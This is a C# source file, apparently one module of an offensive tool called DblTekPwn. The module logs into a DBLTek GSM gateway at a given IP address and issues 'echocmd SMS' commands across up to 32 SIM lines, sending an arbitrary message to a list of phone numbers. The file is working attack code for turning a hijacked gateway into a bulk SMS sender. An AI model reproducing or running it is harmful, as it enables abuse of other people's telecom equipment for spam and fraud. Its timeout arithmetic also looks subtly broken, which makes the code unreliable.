using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using DblTekPwn;

namespace DblTekPwn.SMS
{
    public class SmsSender
    {
        public static bool SendSms(string ip, int port, string[] numbers, string content, int lineRangeLow = 1, int lineRangeHigh = 32)
        {
            var phone = new DblTekPwn(ip, port);
            if (!phone.TestLogin())
                return false;

            content = content.Replace('\r', ' ').Replace('\n', ' ').Replace('\t', ' ');

            List<string> commandStrings = new List<string>();

            foreach (string number in numbers)
            {
                for (int i = lineRangeLow; i <= lineRangeHigh; i++)
                {
                    if (i < 10)
                        commandStrings.Add(string.Format("echocmd SMS0{0} {1} \"{2}\"", i, number, content));
                    else
                        commandStrings.Add(string.Format("echocmd SMS{0} {1} \"{2}\"", i, number, content));
                }
            }
            return phone.SendCommands(commandStrings.ToArray(), lineRangeHigh - lineRangeLow * 1000);
        }
    }
}
